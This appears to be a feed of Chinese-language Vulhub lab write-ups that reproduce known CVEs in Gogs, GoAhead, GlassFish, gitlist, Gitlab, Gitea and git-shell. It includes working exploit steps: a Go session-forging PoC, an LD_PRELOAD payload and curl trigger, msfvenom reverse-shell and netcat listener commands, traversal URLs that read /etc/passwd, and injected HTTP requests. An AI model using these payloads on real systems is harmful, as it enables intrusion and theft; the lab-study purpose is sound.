+    <content><![CDATA[<h1 id="Gogs-任意用户登录漏洞（CVE-2018-18925）"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）</h1><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p>
+<p>其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/gogs/gogs/issues/5469" target="_blank" rel="noopener">https://github.com/gogs/gogs/issues/5469</a></li>
+<li><a href="https://xz.aliyun.com/t/3168" target="_blank" rel="noopener">https://xz.aliyun.com/t/3168</a></li>
+<li><a href="https://www.anquanke.com/post/id/163575" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163575</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:3000</code>，即可看到安装页面。安装时选择sqlite数据库，并开启注册功能。</p>
+<p>安装完成后，需要重启服务：<code>docker-compose restart</code>，否则session是存储在内存中的。</p>
+<p>使用Gob序列化生成session文件：</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"encoding/gob"</span></span><br><span class="line">    <span class="string">"encoding/hex"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncodeGob</span><span class="params">(obj <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> obj &#123;</span><br><span class="line">        gob.Register(v)</span><br><span class="line">    &#125;</span><br><span class="line">    buf := bytes.NewBuffer(<span class="literal">nil</span>)</span><br><span class="line">    err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line">    <span class="keyword">return</span> buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> uid <span class="keyword">int64</span> = <span class="number">1</span></span><br><span class="line">    obj := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">"_old_uid"</span>: <span class="string">"1"</span>, <span class="string">"uid"</span>: uid, <span class="string">"uname"</span>: <span class="string">"admin1"</span>&#125;</span><br><span class="line">    data, err := EncodeGob(obj)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    err = ioutil.WriteFile(<span class="string">"poc"</span>, data, os.O_CREATE|os.O_WRONLY)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    edata := hex.EncodeToString(data)</span><br><span class="line">    fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：</p>
+<p><img src="https://image.3001.net/images/20210809/16285012095663.png" alt="image-20210809164054788"></p>
+<p>通过这个附件的URL，得知这个文件的文件名：<code>./attachments/f3768c6e-2798-478d-affa-719958a8c94a</code>。</p>
+<p><img src="https://image.3001.net/images/20210809/16285012132101.png" alt="image-20210809164628830"></p>
+<p>然后，构造Cookie：<code>i_like_gogits=../attachments/f/3/f3768c6e-2798-478d-affa-719958a8c94a</code>，访问即可发现已经成功登录id=1的用户（即管理员）。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Gogs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GoAhead Web 服务器 HTTPd &#39;LD_PRELOAD&#39; 远程代码执行 (CVE-2017-17562)</title>
+    <url>/2021/08/05/GoAhead%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%20HTTPd%20&#39;LD_PRELOAD&#39;%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20(CVE-2017-17562)/</url>
+    <content><![CDATA[<h1 id="GoAhead-Web-服务器-HTTPd-‘LD-PRELOAD’-远程代码执行-CVE-2017-17562"><a href="#GoAhead-Web-服务器-HTTPd-‘LD-PRELOAD’-远程代码执行-CVE-2017-17562" class="headerlink" title="GoAhead Web 服务器 HTTPd ‘LD_PRELOAD’ 远程代码执行 (CVE-2017-17562)"></a>GoAhead Web 服务器 HTTPd ‘LD_PRELOAD’ 远程代码执行 (CVE-2017-17562)</h1><p>Embedthis GoAhead 是世界上最流行的微型嵌入式 Web 服务器，部署在数亿台设备中，是最小嵌入式设备的理想选择。</p>
+<p>如果启用 CGI 并且动态链接 CGI 程序，则 3.6.5 之前的 GoAhead 允许远程代码执行。这是在<code>cgi.c</code>. 当与 glibc 动态链接器结合使用时，这种行为可能会被滥用用于使用特殊参数名称的远程代码执行，例如<code>LD_PRELOAD</code>. 攻击者可以在请求正文中发布他们的共享对象负载，并使用 /proc/self/fd/0 引用它。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="noopener">https://www.elttam.com.au/blog/goahead/</a></li>
+<li><a href="https://www.exploit-db.com/exploits/43360" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43360</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>然后，您可以看到欢迎页面在<code>http://192.168.44.132:8080</code>，CGI 脚本在<code>http://192.168.44.132:8080/cgi-bin/index</code>处可用。</p>
+<p>首先，将这段劫持代码编译成动态共享库：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Hello: World!\n"</span>, <span class="number">14</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>请注意，由于 GoAhead 是运行在几乎所有可能的 IoT 设备上的紧凑型嵌入式 Web 服务器，因此动态共享库的格式始终取决于目标服务器架构。在现实世界中，虽然 Vulhub 可以向您展示一个最简单的示例，但编译漏洞并不像本手册所建议的那么容易。</p>
+</blockquote>
+<p>在 x86/64 环境下编译：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC .&#x2F;payload.c -o payload.so</span><br></pre></td></tr></table></figure>
+
+<p>使用 curl 触发攻击：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so &quot;http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;cgi-bin&#x2F;index?LD_PRELOAD&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;0&quot; -i</span><br></pre></td></tr></table></figure>
+
+<p><code>Hello: world!</code>打印响应头以指示代码已执行：</p>
+<p><img src="https://image.3001.net/images/20210809/16284917299525.png" alt="image-20210806154725109"></p>
+<p>可以编译反弹shell，poc：</p>
+<p><a href="https://github.com/ivanitlearning/CVE-2017-17562" target="_blank" rel="noopener">https://github.com/ivanitlearning/CVE-2017-17562</a></p>
+<p>执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; msfvenom -a x64 --platform Linux -p linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.49.2 LPORT&#x3D;4444 -f elf-so -o payload.so</span><br><span class="line"></span><br><span class="line">&gt; python exploit.py -rhost 192.168.49.2 -rport 8080 -cgipath &#x2F;cgi-bin&#x2F;index -payload payload.so</span><br><span class="line"></span><br><span class="line">&gt; nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210809/16284917324878.png" alt="image-20210806172818326"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>GoAhead</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GlassFish 任意文件读取漏洞</title>
+    <url>/2021/08/05/GlassFish%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h1><p>java语言中会把<code>%c0%ae</code>解析为<code>\uC0AE</code>，最后转义为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p>
+<p>参考文章：<a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904" target="_blank" rel="noopener">https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904</a></p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://192.168.44.132:8080</code>和<code>http://192.168.44.132:4848</code>即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。</p>
+<p>访问<code>https://192.168.44.132:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code>，发现已成功读取<code>/etc/passwd</code>内容：</p>
+<p><img src="https://image.3001.net/images/20210809/16284911395978.png" alt="image-20210806105221808"></p>
+<h2 id="额外说明"><a href="#额外说明" class="headerlink" title="额外说明"></a>额外说明</h2><p>本环境超级管理员密码在<code>docker-compose.yml</code>中设置，默认为<code>vulhub_default_password</code>，在4848端口利用该密码可以登录管理员账户。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>GlassFish</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）</title>
+    <url>/2021/08/04/gitlist%200.6.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1000533%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）"><a href="#gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）"></a>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）</h1><p>gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本及以前，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p>
+<a id="more"></a>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在用户对仓库中代码进行搜索的时候，gitlist将调用<code>git grep</code>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $query &#x3D; escapeshellarg($query);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        $results &#x3D; $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>$query</code>是搜索的关键字，<code>$branch</code>是搜索的分支。</p>
+<p>如果用户输入的<code>$query</code>的值是<code>--open-files-in-pager=id;</code>，将可以执行<code>id</code>命令：</p>
+<p><img src="https://image.3001.net/images/20210805/16281327613722.png" alt="img"></p>
+<p>导致这个漏洞的原因，有几点：</p>
+<ol>
+<li>开发者对于<code>escapeshellarg</code>函数的误解，造成参数注入</li>
+<li><code>git grep</code>的参数<code>--open-files-in-pager</code>的值，将被直接执行</li>
+</ol>
+<p>理论上，在经过<code>$query = escapeshellarg($query);</code>处理后，<code>$query</code>将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。</p>
+<p>我们可以试一下如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git grep -i --line-number -e &#39;--open-files-in-pager&#x3D;id;&#39; master</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210805/16281327634508.png" alt="img"></p>
+<p>如上图，我将<code>$query</code>放在了<code>-e</code>参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数<code>--open-files-in-pager</code>。</p>
+<p>这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：</p>
+<blockquote>
+<p>-e The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by or.</p>
+</blockquote>
+<p>当然，gitlist的开发者用了另一种修复方案：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    $query &#x3D; preg_replace(&#39;&#x2F;(--?[A-Za-z0-9\-]+)&#x2F;&#39;, &#39;&#39;, $query);</span><br><span class="line">    $query &#x3D; escapeshellarg($query);</span><br><span class="line">    try &#123;</span><br><span class="line">        $results &#x3D; $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先用<code>preg_replace</code>将<code>-</code>开头的非法字符移除，然后将<code>$query</code>放在<code>--</code>的后面。在命令行解析器中，<code>--</code>的意思是，此后的部分不会再包含参数选项（option）：</p>
+<blockquote>
+<p>A – signals the end of options and disables further option processing. Any arguments after the – are treated as filenames and arguments. An argument of - is equivalent to –.</p>
+<p>If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash’s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.</p>
+</blockquote>
+<p>举个简单的例子，如果我们需要查看一个文件名是<code>--name</code>的文件，我们就不能用<code>cat --name</code>来读取，也不能用<code>cat &#39;--name&#39;</code>，而必须要用<code>cat -- --name</code>。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p>
+<p><img src="https://image.3001.net/images/20210805/16281327679883.png" alt="img"></p>
+<p>所以官方这个修复方案也是可以接受的，只不过第一步的<code>preg_replace</code>有点影响正常搜索功能。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将看到一个名为<code>example</code>的仓库。</p>
+<p>发送如下数据包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;example&#x2F;tree&#x2F;a&#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;64.0.3282.186 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">query&#x3D;--open-files-in-pager&#x3D;touch &#x2F;tmp&#x2F;success;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210805/16281327701311.png" alt="image-20210804173533567"></p>
+<p>其中，我们访问的是<code>/example/tree/a/search</code>，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是<code>&quot;grep -i --line-number {$query} $branch&quot;</code>中的<code>$branch</code>，但因为我们的<code>$query</code>被当成了一个参数，所以<code>$branch</code>就应该被当做搜索的关键字。</p>
+<p>如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了“a”这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</p>
+<p>数据包发送后，用<code>docker-compose exec web bash</code>进入容器中，可见<code>/tmp/success</code>已成功创建：</p>
+<p><img src="https://image.3001.net/images/20210805/1628132773176.png" alt="image-20210804173513039"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>gitlist</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gitlab 任意文件读取漏洞（CVE-2016-9086）</title>
+    <url>/2021/08/04/Gitlab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-9086%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Gitlab-任意文件读取漏洞（CVE-2016-9086）"><a href="#Gitlab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="Gitlab 任意文件读取漏洞（CVE-2016-9086）"></a>Gitlab 任意文件读取漏洞（CVE-2016-9086）</h1><p>Gitlab版本：8.13.1</p>
+<p>原理剖析：<a href="http://paper.seebug.org/104/" target="_blank" rel="noopener">http://paper.seebug.org/104/</a></p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行Gitlab（运行后502错误）。</p>
+<p>环境运行后，Web端口为10080，ssh端口为10022。访问<code>http://192.168.44.132:10080</code>，设置管理员（用户名<code>root</code>）密码，登录。</p>
+<p>新建一个项目，点击<code>GitLab export</code>：</p>
+<p><img src="https://image.3001.net/images/20210805/16281316728341.png" alt="image-20210804170511510"></p>
+<p>将<a href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2016-9086/test.tar.gz" target="_blank" rel="noopener">test.tar.gz</a>上传，将会读取到<code>/etc/passwd</code>文件内容：</p>
+<p><img src="https://image.3001.net/images/20210805/16281316747815.png" alt="image-20210804170856925"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Gitlab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gitea 1.4.0 目录穿越导致命令执行漏洞</title>
+    <url>/2021/08/04/Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html" target="_blank" rel="noopener">https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http:/192.168.44.132:3000</code>，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）</p>
+<p>安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</p>
+<p><img src="https://image.3001.net/images/20210805/16281313988525.png" alt="image-20210804154233163"></p>
+<p>然后，需要执行一次<code>docker-compose restart</code>重启gitea服务。（原因详见第二个参考链接）</p>
+<p>由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</p>
+<p>打开gitea，找到刚才创建的公开项目，如admin1/repo，发送如下数据包，添加一个Git LFS对象：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin1&#x2F;repo.git&#x2F;info&#x2F;lfs&#x2F;objects HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:3000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: application&#x2F;vnd.git-lfs+json</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 151</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Oid&quot;: &quot;......&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;,</span><br><span class="line">    &quot;Size&quot;: 1000000,</span><br><span class="line">    &quot;User&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Password&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Repo&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Authorization&quot; : &quot;a&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210805/16281314015406.png" alt="image-20210804154818003"></p>
+<p>然后，访问<code>http://192.168.44.132:3000/admin1/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</code>，即可看到<code>/etc/passwd</code>已被成功读取：</p>
+<p><img src="https://image.3001.net/images/20210805/16281314055909.png" alt="image-20210804154843852"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Gitea</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GIT-SHELL 沙盒绕过（CVE-2017-8386）</title>
+    <url>/2021/08/03/GIT-SHELL%20%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%EF%BC%88CVE-2017-8386%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="GIT-SHELL-沙盒绕过（CVE-2017-8386）"><a href="#GIT-SHELL-沙盒绕过（CVE-2017-8386）" class="headerlink" title="GIT-SHELL 沙盒绕过（CVE-2017-8386）"></a>GIT-SHELL 沙盒绕过（CVE-2017-8386）</h1><p>GIT-SHELL 沙盒绕过（CVE-2017-8386）导致任意文件读取、可能的任意命令执行漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/" target="_blank" rel="noopener">https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>为了不和docker母机的ssh端口冲突，我将容器的ssh端口设置成3322。本目录下我生成了一个<code>id_rsa</code>，这是ssh的私钥，连接的时候请指定之。</p>
+<p>在连接以前，需要先设置私钥的权限为0600：<code>chmod 0600 id_rsa</code>，否则连接可能失败。</p>
+<p>正常连接其ssh服务<code>ssh -p 3322 -i id_rsa git@127.0.0.1</code>，会被git-shell给拦截，返回错误<code>fatal: unrecognized command &#39;&#39;</code>，并且连接被关闭。</p>
+<p>使用–help技巧，连接目标并进入帮助页面：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 3322 -i id_rsa -t git@127.0.0.1 &quot;git-upload-archive &#39;--help&#39;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>按<code>shift</code>+e，读取任意文件：</p>
+<p><img src="https://image.3001.net/images/20210803/16279955969623.png" alt="image-20210803170619933"></p>
+<p>回到帮助页面，输入<code>!id</code>执行命令：</p>
+<p><img src="https://image.3001.net/images/20210803/1627995599820.png" alt="image-20210803170710064"></p>
+<p>(为什么是www-data用户？因为git用户和www-data用户编号都是33，所以其实他们是一个用户)</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="基于ssh协议的git拉取流程"><a href="#基于ssh协议的git拉取流程" class="headerlink" title="基于ssh协议的git拉取流程"></a>基于ssh协议的git拉取流程</h3><p>git-shell是git服务中重要的组成部分，众所周知，git服务支持ssh、git、https三种协议来传递项目，其中ssh是最安全，也最方便的一种方式。</p>
+<p>我们随便打开Github上一个项目，找到<code>Clone with SSH</code>里列出的地址：:phith0n/vulhub.git，其实这个url就是告诉git，ssh用户名是git，地址是github.com（默认端口是22），该项目位于<code>phith0n/vulhub.git</code>这个目录下；然后git就通过ssh协议连接上github.com，并将对应目录下的项目拉取下来。</p>
+<p>所以，基于ssh协议的git clone等操作，本质上就是通过ssh协议连接上git服务器，并将指定目录拉取下来的过程。</p>
+<p>那么，既然这个过程是个ssh交互的过程，那么我直接执行<code>ssh git@github.com</code>是不是就可以登录github服务器了呢？显然是不行的，你可以试试：</p>
+<p>说“不行”其实也有偏差，实际上我确实是连接上了其ssh服务，并验证身份通过了，但他给了我一段提示信息“Hi phith0n! You’ve successfully authenticated, but GitHub does not provide shell access.”，就把我的连接关了。</p>
+<p>所以，正常来说，基于ssh的git拉取过程对于git服务器是安全的。</p>
+<p>关于如何搭建一个git服务器，可以参考<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137583770360579bc4b458f044ce7afed3df579123eca000" target="_blank" rel="noopener">这篇文章</a></p>
+<h3 id="如何禁止git用户执行系统shell"><a href="#如何禁止git用户执行系统shell" class="headerlink" title="如何禁止git用户执行系统shell"></a>如何禁止git用户执行系统shell</h3><p>那么，github这类git服务商是怎么实现上述“安全”通信的流程的呢？</p>
+<p>让用户可以通过ssh认证身份，但又不给用户shell，这个过程有两种方法实现：</p>
+<ol>
+<li>创建系统用户git的时候将其shell设置成git-shell</li>
+<li>在authorized_keys文件每个ssh-key的前面设置command，覆盖或劫持重写原本的命令</li>
+</ol>
+<p>第一种方法比较直观，就是创建用户的时候不给其正常的bash或sh的shell，而是给它一个git-shell。git-shell是一个沙盒环境，在git-shell下，只允许执行沙盒内包含的命令。</p>
+<p>第二种方法不仅在git服务器上使用，很多Linux发行版也会用到。比如aws，默认安装后是不允许root登录的，实现方法就是在/root/.ssh/authorized_keys中设置<code>command=&quot;echo &#39;Please login as the user \&quot;ec2-user\&quot; rather than the user \&quot;root\&quot;.&#39;;echo;sleep 10&quot;</code>。这句话相当于覆盖了原本执行的shell，变成了echo一段文字。</p>
